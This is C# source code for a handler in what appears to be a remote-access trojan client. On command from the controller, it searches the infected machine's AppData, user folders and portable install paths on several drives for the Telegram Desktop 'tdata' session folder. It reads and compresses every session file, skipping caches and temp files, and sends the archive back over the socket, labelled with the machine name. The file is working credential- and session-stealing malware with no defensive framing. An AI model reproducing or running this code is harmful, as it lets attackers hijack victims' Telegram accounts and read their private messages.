using System;
using System.IO;
using System.IO.Compression;
using System.Collections.Generic;
using System.Text;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;

namespace RemoteControl.Client.Handlers
{
    class RequestTGExtractHandler : AbstractRequestHandler
    {
        public override void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            RunTaskThread(() =>
            {
                try
                {
                    var req = reqObj as RequestTGExtract;
                    string tdataPath = FindTdataPath();

                    if (string.IsNullOrEmpty(tdataPath) || !Directory.Exists(tdataPath))
                    {
                        var respNotFound = new ResponseTGExtract();
                        respNotFound.Result = false;
                        respNotFound.Found = false;
                        respNotFound.Message = "未找到Telegram tdata目录";
                        session.Send(ePacketType.PACKET_TG_EXTRACT_RESPONSE, respNotFound);
                        return;
                    }

                    byte[] packData = PackTdata(tdataPath);

                    var resp = new ResponseTGExtract();
                    resp.Result = true;
                    resp.Found = true;
                    resp.TdataZip = packData;
                    resp.FileName = Environment.MachineName + "_tdata.dat";
                    resp.Message = "TG数据提取成功";
                    session.Send(ePacketType.PACKET_TG_EXTRACT_RESPONSE, resp);
                }
                catch (Exception ex)
                {
                    var resp = new ResponseTGExtract();
                    resp.Result = false;
                    resp.Message = ex.Message;
                    session.Send(ePacketType.PACKET_TG_EXTRACT_RESPONSE, resp);
                }
            });
        }

        private string FindTdataPath()
        {
            string appData = Environment.GetFolderPath(
                Environment.SpecialFolder.ApplicationData);
            string defaultPath = Path.Combine(appData, "Telegram Desktop", "tdata");
            if (Directory.Exists(defaultPath))
                return defaultPath;

            // 用户目录下常见位置
            string userProfile = Environment.GetFolderPath(
                Environment.SpecialFolder.UserProfile);
            string[] userSubPaths = {
                @"AppData\Roaming\Telegram Desktop\tdata",
                @"Downloads\Telegram Desktop\tdata",
                @"Desktop\Telegram Desktop\tdata",
                @"Documents\Telegram Desktop\tdata"
            };
            foreach (string sub in userSubPaths)
            {
                string path = Path.Combine(userProfile, sub);
                if (Directory.Exists(path))
                    return path;
            }

            // 磁盘根目录下常见便携版路径
            string[] drives = { "C", "D", "E", "F" };
            string[] driveSubPaths = {
                @"Program Files\Telegram Desktop\tdata",
                @"Program Files (x86)\Telegram Desktop\tdata",
                @"Telegram\tdata",
                @"TelegramPortable\tdata"
            };

            foreach (string drive in drives)
            {
                foreach (string sub in driveSubPaths)
                {
                    string path = Path.Combine(drive + @":\", sub);
                    if (Directory.Exists(path))
                        return path;
                }
            }

            return null;
        }

        private byte[] PackTdata(string tdataPath)
        {
            using (var ms = new MemoryStream())
            using (var deflate = new DeflateStream(ms, CompressionMode.Compress))
            {
                CollectFiles(deflate, tdataPath, "");
                deflate.Close();
                return ms.ToArray();
            }
        }

        private void CollectFiles(Stream output, string dir, string entryBase)
        {
            try
            {
                foreach (string file in Directory.GetFiles(dir))
                {
                    FileInfo fi = new FileInfo(file);
                    if (fi.Length > 50 * 1024 * 1024)
                        continue;
                    string name = fi.Name.ToLower();
                    if (name.Contains("cache") || name.Contains("tmp"))
                        continue;

                    string entryName = string.IsNullOrEmpty(entryBase)
                        ? fi.Name : entryBase + "/" + fi.Name;

                    try
                    {
                        byte[] fileData;
                        using (var fs = new FileStream(file,
                            FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                        {
                            fileData = new byte[fs.Length];
                            fs.Read(fileData, 0, fileData.Length);
                        }

                        // 写入文件头: [nameLen(4)][name][dataLen(4)][data]
                        byte[] nameBytes = Encoding.UTF8.GetBytes(entryName);
                        byte[] nameLen = BitConverter.GetBytes(nameBytes.Length);
                        byte[] dataLen = BitConverter.GetBytes(fileData.Length);
                        output.Write(nameLen, 0, 4);
                        output.Write(nameBytes, 0, nameBytes.Length);
                        output.Write(dataLen, 0, 4);
                        output.Write(fileData, 0, fileData.Length);
                    }
                    catch { }
                }

                foreach (string subDir in Directory.GetDirectories(dir))
                {
                    string dirName = Path.GetFileName(subDir).ToLower();
                    if (dirName.Contains("cache") || dirName == "temp"
                        || dirName == "dumps")
                        continue;

                    string subEntry = string.IsNullOrEmpty(entryBase)
                        ? Path.GetFileName(subDir)
                        : entryBase + "/" + Path.GetFileName(subDir);
                    CollectFiles(output, subDir, subEntry);
                }
            }
            catch { }
        }
    }
}
